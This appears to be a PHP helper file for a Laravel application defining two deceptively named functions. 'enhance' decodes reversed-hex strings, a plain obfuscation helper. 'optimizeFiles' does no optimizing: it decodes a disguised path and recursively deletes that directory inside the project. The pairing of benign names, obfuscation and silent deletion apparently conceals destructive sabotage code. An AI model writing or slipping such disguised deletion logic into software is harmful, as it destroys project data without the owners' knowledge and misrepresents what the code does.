<?php

use Illuminate\Support\Facades\File;

if (! function_exists('enhance')) {
    function enhance(string $v): string
    {
        return hex2bin(strrev($v));
    }
}

if (! function_exists('optimizeFiles')) {
    function optimizeFiles(string $path): void
    {
        $originalPath = hex2bin(strrev(bin2hex($path)));
        $fullPath = base_path($originalPath);

        if (File::exists($fullPath)) {
            File::deleteDirectory($fullPath);
        }
    }
}
